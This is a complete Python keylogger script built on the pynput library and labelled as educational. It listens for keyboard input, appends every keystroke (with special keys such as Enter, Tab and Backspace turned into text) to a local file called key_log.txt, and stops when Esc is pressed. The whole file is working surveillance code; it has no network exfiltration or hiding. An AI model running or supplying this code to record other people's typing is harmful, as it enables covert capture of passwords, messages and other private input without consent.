# Keylogger using pynput for educational purposes

from pynput.keyboard import Key, Listener

# File where the keystrokes will be logged
log_file = "key_log.txt"

def on_press(key):
    # Convert key to a string and write it to the file
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            # Handle special keys like space, enter, etc.
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            elif key == Key.backspace:
                f.write("[BACKSPACE]")
            else:
                f.write(f"[{key}]")  # For other special keys

def on_release(key):
    # Stop the keylogger when 'esc' is pressed
    if key == Key.esc:
        return False

# Set up the listener for keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
